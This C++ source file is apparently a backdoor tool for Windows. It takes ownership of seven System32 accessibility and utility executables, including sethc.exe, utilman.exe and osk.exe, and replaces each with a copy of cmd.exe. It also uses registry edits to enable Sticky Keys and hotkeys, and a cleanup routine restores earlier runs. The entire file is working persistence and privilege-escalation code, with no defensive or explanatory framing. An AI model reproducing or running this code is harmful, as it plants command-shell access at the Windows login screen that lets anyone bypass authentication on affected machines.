#include <iostream>
#include <cstdlib>
#include <fstream>
#include <vector>
#include <string>

void priv_esc() {
    //grants administrative permissions to sethc.exe (Sticky Keys)
    system("takeown /f C:\\Windows\\System32\\sethc.exe");
    system("icacls C:\\Windows\\System32\\sethc.exe /grant administrators:F");

    //grants administrative permissions to utilman.exe (Utility Manager)
    system("takeown /f C:\\Windows\\System32\\utilman.exe");
    system("icacls C:\\Windows\\System32\\utilman.exe /grant administrators:F");

    //grants administrative permissions to narrator.exe (Narrator)
    system("takeown /f C:\\Windows\\System32\\narrator.exe");
    system("icacls C:\\Windows\\System32\\narrator.exe /grant administrators:F");

    //grants administrative permissions to osk.exe (On Screen Keyboard)
    system("takeown /f C:\\Windows\\System32\\osk.exe");
    system("icacls C:\\Windows\\System32\\osk.exe /grant administrators:F");

    //grants administrative permissions to sethc.exe (Magnifier)
    system("takeown /f C:\\Windows\\System32\\magnify.exe");
    system("icacls C:\\Windows\\System32\\magnify.exe /grant administrators:F");

    //grants administrative permissions to displayswitch.exe (Display)
    system("takeown /f C:\\Windows\\System32\\displayswitch.exe");
    system("icacls C:\\Windows\\System32\\displayswitch.exe /grant administrators:F");

    //grants administrative permissions to snippingtool.exe (Snipping Tool)
    system("takeown /f C:\\Windows\\System32\\snippingtool.exe");
    system("icacls C:\\Windows\\System32\\snippingtool.exe /grant administrators:F");
}

void cleanup() {
    //searches through system32 to find previously-run backdoors
    system("dir C:\\Windows\\System32\\old-*.* /b /s > old_files.txt");
    std::vector<std::string> replacedExecutables;
    std::ifstream file("old_files.txt");
    std::string line;

    //reads each line from the file and add to the vector
    while (std::getline(file, line)) {
        replacedExecutables.push_back(line);
    }
    file.close();

    //list of original executable files replaced with cmd.exe
    std::vector<std::string> backdoorList = {
        "C:\\Windows\\System32\\sethc.exe",
        "C:\\Windows\\System32\\utilman.exe",
        "C:\\Windows\\System32\\narrator.exe",
        "C:\\Windows\\System32\\osk.exe",
        "C:\\Windows\\System32\\magnify.exe",
        "C:\\Windows\\System32\\displayswitch.exe",
        "C:\\Windows\\System32\\snippingtool.exe"
    };

    //deletes backdoor executables (cmd.exe replacements)
    for (const std::string& backdoor : backdoorList) {
        std::string delCommand = "del \"" + backdoor + "\"";
        system(delCommand.c_str());
    }    

    //restores original executables by renaming old-* files back to their original names
    for (const std::string& executable : replacedExecutables) {
        std::string original = executable;
        original.replace(executable.find("old-"), 4, "");
        std::string renameCommand = "rename \"" + executable + "\" \"" + original + "\"";
        system(renameCommand.c_str());
    }
}

void sticky_keys() {
    //makes sure that sticky keys is turned on
    system("reg add \"HKEY_CURRENT_USER\\Control Panel\\Accessibility\\StickyKeys\" /v \"Flags\" /t REG_SZ /d \"507\" /f");
    
    //replaces sethc.exe with cmd.exe
    system("rename C:\\Windows\\System32\\sethc.exe old-sethc.exe");
    system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe");
}

void utility_manager() {
    //replaces utilman.exe with cmd.exe
    system("rename C:\\Windows\\System32\\utilman.exe old-utilman.exe");
    system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe");
}

void narrator() {
    //replaces narrator.exe with cmd.exe
    system("rename C:\\Windows\\System32\\narrator.exe old-narrator.exe");
    system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\narrator.exe");
}

void on_screen_keyboard() {
    //replaces osk.exe with cmd.exe
    system("rename C:\\Windows\\System32\\osk.exe old-osk.exe");
    system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\osk.exe");
}

void magnifier() {
    //replaces magnify.exe with cmd.exe
    system("rename C:\\Windows\\System32\\magnify.exe old-magnify.exe");
    system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\magnify.exe");
}

void display_switch() {
    //replaces displayswitch.exe with cmd.exe
    system("rename C:\\Windows\\System32\\displayswitch.exe old-displayswitch.exe");
    system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\displayswitch.exe");
}

void snipping_tool() {
    //replaces snippingtool.exe with cmd.exe
    system("rename C:\\Windows\\System32\\snippingtool.exe old-snippingtool.exe");
    system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\snippingtool.exe");
}

int main(){
    //grants administrator permissions to all backdoor executables
    priv_esc();

    //enables all windows hotkeys on the system
    system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v \"DisabledHotkeys\" /t REG_BINARY /d \"\" /f");

    //cleans up previous runs beforehand
    cleanup();

    //executes backdoors
    sticky_keys();
    utility_manager();
    narrator();
    on_screen_keyboard();
    magnifier();
    display_switch();
    snipping_tool();
    return 0;
}